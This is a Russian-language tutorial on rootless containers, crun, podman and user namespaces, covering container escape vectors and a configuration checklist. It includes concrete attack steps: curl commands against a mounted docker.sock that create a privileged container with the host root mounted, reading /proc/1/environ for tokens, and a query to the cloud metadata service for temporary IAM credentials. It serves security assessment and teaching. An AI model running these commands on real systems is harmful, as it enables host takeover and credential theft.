## Вопрос, с которого всё начинается

Ты запускаешь контейнер от обычного пользователя — без `sudo` — и он работает. Как это возможно, ведь контейнер требует изоляции, а изоляция исторически требовала root? Ответ — **rootless-контейнеры** на user namespaces, и рантаймы вроде **crun** с менеджером **podman**. Разберём, как это устроено и где всё ещё можно «выйти».

## Наш пример: вывод podman inspect

```
$ cat podman_inspect.txt
runtime=crun
rootless=true
userns=host->container:0:65536
privileged=false
cap_add=[]
mounts=/host-data:/data:rw
```

Здесь видно: рантайм `crun`, режим rootless, маппинг пользователей и — подозрительное — общий том с хоста. Разберём по порядку.

## Шаг 1: OCI-рантайм

**OCI** (Open Container Initiative) — стандарт формата контейнера и его запуска. **Рантайм** — программа, которая по этому стандарту создаёт контейнер: namespaces, cgroups, монтирования, запуск процесса. Классический рантайм — `runc`; более новый и лёгкий — `crun` (написан на C). Оба совместимы с OCI, поэтому взаимозаменяемы.

## Шаг 2: crun против runc

- `runc` — референсный рантайм на Go, используется Docker по умолчанию;
- `crun` — быстрый рантайм на C, часто в podman; меньше памяти, быстрее старт.

С точки зрения безопасности разница невелика: оба используют одни механизмы ядра. Важнее **конфигурация**, чем имя рантайма.

## Шаг 3: rootless и user namespaces

**Rootless** означает, что контейнер запускается без прав root на хосте. Работает это через **user namespace**: внутри контейнера процесс может быть UID 0 (root), но этот «root» маппится на обычного пользователя хоста (`userns=host->container:0:65536`). Даже если внутри ты root — снаружи ты никто. Это сильно уменьшает ущерб от побега.

## Шаг 4: podman

**podman** — менеджер контейнеров, работающий без демона и по умолчанию rootless. В отличие от Docker (демон с правами root), podman запускает контейнеры от имени пользователя. Это убирает классический риск «демон — единая точка отказа».

## Шаг 5: векторы побега

Даже rootless-контейнер может «протечь»:

- **privileged** — если контейнер запущен с `--privileged`, изоляция почти снята;
- **общие монтирования** — том `/host-data:/data:rw` даёт доступ к хостовым файлам;
- **capabilities** — лишние возможности (`cap_add`) расширяют права;
- **docker.sock / podman.sock** — если сокет смонтирован в контейнер, ты можешь управлять контейнерами хоста;
- **user namespace без ограничений** — старые ядра позволяли эскалацию через userns.

## Шаг 6: практический порядок

1. Определить рантайм и режим (rootless/rootful).
2. Посмотреть маппинг user namespace.
3. Проверить `privileged` и `cap_add`.
4. Проверить монтирования (особенно хостовые пути).
5. Искать смонтированные сокеты (`.sock`) — это прямой путь на хост.

## Разбор кейса: побег через смонтированный сокет

Самая частая «щель» rootless-контейнера — не рантайм, а то, что в него смонтировали. Разберём сценарий из нашего примера: внутри контейнера лежит общий том и, возможно, сокет.

```bash
$ ls -l /var/run/*.sock /run/*.sock 2>/dev/null
srw-rw---- 1 root root 0 /var/run/docker.sock
```

Если смонтирован `docker.sock`, ты можешь управлять контейнерами хоста через API. Проверка — обычным `curl` по unix-сокету:

```bash
$ curl -s --unix-socket /var/run/docker.sock http://localhost/version | head
{"Version":"24.0.7", ...}
$ curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
[{"Id":"...","Image":"...","Names":["/target"], ...}]
```

Через API запускают новый контейнер с привилегированным режимом и монтируют корень хоста:

```bash
$ curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create?name=x \
  -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

Это уже полноценный побег: доступ к файловой системе хоста. Для podman аналогично работает `podman-remote` или тот же unix-сокет `podman.sock`.

## Таблица: признаки опасной конфигурации

| Признак | Что означает | Риск |
|---|---|---|
| `privileged: true` | снята почти вся изоляция | прямой побег (capabilities + доступ к устройствам) |
| смонтирован `*.sock` | доступ к API менеджера контейнеров | запуск привилегированного контейнера на хосте |
| `/` или `/etc` в монтированиях | файлы хоста внутри контейнера | чтение/запись конфигов и ключей хоста |
| `cap_add: [SYS_ADMIN]` | возможность монтировать и менять namespaces | побег через `mount`/`nsenter` |
| `userns=host` | без user namespace | root внутри = root снаружи |
| `/dev/kvm` смонтирован | доступ к гипервизору | побег из VM-контейнера |
| writable hostPath в k8s | запись в директорию узла | подмена бинарника/конфига узла |

Проверяй эти признаки первыми: чаще всего побег даёт не уязвимость рантайма, а конфигурация запуска.

## Практические команды проверки

```bash
$ cat /proc/self/uid_map          # маппинг uid: 0 1000 1 -> root внутри = uid 1000 снаружи
$ capsh --print | grep Current    # список capabilities
$ cat /proc/self/status | grep Cap
$ mount | grep -E '(/|/etc|/var/run)'   # подозрительные монтирования
$ find / -name '*.sock' -type s 2>/dev/null
$ ls /dev/kvm /dev/mem /dev/sda 2>/dev/null
```

Если `uid_map` показывает `0 0 4294967295`, user namespace не изолирует — это rootful-контейнер, и любой побег даёт root хоста.

## Если не сработало

- **Сокета нет, том read-only.** Ищи другие каналы: переменные окружения с токенами, `/proc/1/environ`, credentials облака (метаданные 169.254.169.254), SSH-ключи в домашней директории.
- **`capsh` показывает только базовые capabilities.** Значит, контейнер хорошо изолирован — оцени, есть ли версия рантайма с известной CVE (устаревший runc/crun), это отдельный вектор.
- **Побег не нужен, а нужно читать.** Иногда достаточно того, что смонтировано: хостовые логи, конфиги, ключи уже внутри.
- **Podman rootless без сокета.** `podman` по умолчанию без демона, значит API-вектора нет; смотри конфигурацию томов и capabilities.

## Ограничения

Rootless-контейнеры на user namespaces действительно уменьшают ущерб: даже получив root внутри, снаружи ты обычный пользователь. Но это не абсолютная защита — «вылезти» можно через смонтированный сокет, широкие capabilities, общий корень или уязвимость ядра/рантайма. Безопасность здесь определяется конфигурацией запуска (монтирования, capabilities, privileged), а не именем рантайма: `crun` и `runc` используют одни механизмы ядра и в равной степени зависят от того, что им разрешили.

## Практика: определить режим и маппинг за секунды

Внутри контейнера первые команды отвечают на главные вопросы: rootless или нет, какие capabilities, что смонтировано.

```bash
$ id
uid=0(root) gid=0(root) groups=0(root)      # внутри — root
$ cat /proc/self/uid_map
         0       1000          1            # снаружи это uid 1000 -> rootless
$ cat /proc/self/gid_map
         0       1000          1
$ grep Cap /proc/self/status
CapEff: 00000000a80425fb                    # базовые docker-права
$ capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,...,cap_net_raw
```

Разница между `0 1000 1` и `0 0 4294967295` принципиальна. Первое — user namespace включён, «root» внутри бесправен снаружи. Второе — namespaces не изолируют, и это фактически root хоста. Именно эту строку проверяют первой.

Дальше смотрят монтирования и устройства:

```bash
$ mount | grep -vE 'proc|sys|dev/pts|cgroup'
overlay on / type overlay (...)
/dev/sda1 on /host-data type ext4 (rw)      # хостовый диск, доступен на запись
$ ls /dev | grep -E 'kvm|sda|mem'
```

Если видно `/dev/kvm` — контейнер может запускать вложенные ВМ (актуально для VM-рантаймов). Если `/dev/sda` доступен — можно читать диск хоста напрямую. Каждый такой признак — отдельный вектор, и все они проверяются быстро, без поиска CVE в рантайме.

## Порядок оценки контейнерной площадки

1. Режим: rootless/rootful (по `uid_map`).
2. Capabilities: базовые или расширенные (`capsh --print`).
3. Монтирования: есть ли хостовые пути и сокеты (`mount`, `find / -type s`).
4. Устройства: `/dev/kvm`, блочные устройства.
5. Версия рантайма: устаревший runc/crun с известной CVE.
6. Метаданные: облачные токены, переменные окружения, SSH-ключи.

Только после этого имеет смысл искать уязвимость в самом рантайме — конфигурация даёт путь быстрее и надёжнее.

## Итоговый чек-лист оценки контейнера

- `cat /proc/self/uid_map`: `0 1000 1` — rootless, `0 0 ...` — фактически root хоста.
- `capsh --print`: базовые capabilities или расширенные (`SYS_ADMIN` — тревога).
- `mount`: хостовые пути (`/`, `/etc`, `/host-data`) и режим записи.
- `find / -type s`: смонтированный `docker.sock`/`podman.sock` — прямой путь на хост.
- `/dev/kvm`, `/dev/sda`, `/dev/mem` — доступ к гипервизору и дискам.
- Переменные окружения, `/proc/1/environ`, облачные метаданные — токены и ключи.
- Устаревший `runc`/`crun` с известной CVE — отдельный вектор, если конфигурация чиста.

## Ещё один вектор: доступ к метаданным облака

Если контейнер крутится в облаке, изнутри часто доступен сервис метаданных. Проверка занимает секунду:

```bash
$ curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

В AWS это вернёт имя роли, а следующий запрос — временные ключи. В GCP нужен заголовок `Metadata-Flavor: Google`, в Azure — `Metadata: true`. Для rootless-контейнера это особенно важно: даже без побега изоляции временные облачные креды дают доступ к аккаунту, а значит и к новым ресурсам.

## Что мы теперь знаем

- OCI-рантайм создаёт контейнер по стандарту; `runc` и `crun` взаимозаменяемы.
- Rootless работает через user namespaces: root внутри ≠ root снаружи.
- podman запускает контейнеры без демона и по умолчанию rootless.
- Векторы: privileged, общие тома, capabilities, смонтированный сокет.
- Безопасность определяется конфигурацией, а не только рантаймом.
